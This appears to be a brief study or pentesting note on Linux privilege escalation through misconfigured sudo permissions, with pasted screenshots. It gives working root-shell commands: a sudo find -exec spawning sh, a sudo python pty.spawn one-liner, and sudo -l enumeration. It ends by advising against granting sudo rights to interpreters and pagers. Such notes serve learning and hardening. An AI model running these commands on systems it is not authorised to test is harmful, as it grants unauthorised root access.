If the attacker can’t directly get root access via any other techniques, he might try to compromise any of the users who have SUDO access.

```
sudo -l      print command allow to run as sudo
```

![](Pasted%20image%2020250701100921.png)

```
  sudo find /home -exec sh -i \;     exec parameter can be used for arbitrary code execution.
```

![](Pasted%20image%2020250701101117.png)

```
sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’   spawns a shell
```

![](Pasted%20image%2020250701101206.png)

 Never give SUDO rights to vi, more, less, nmap, perl, ruby, python, gdb and others.
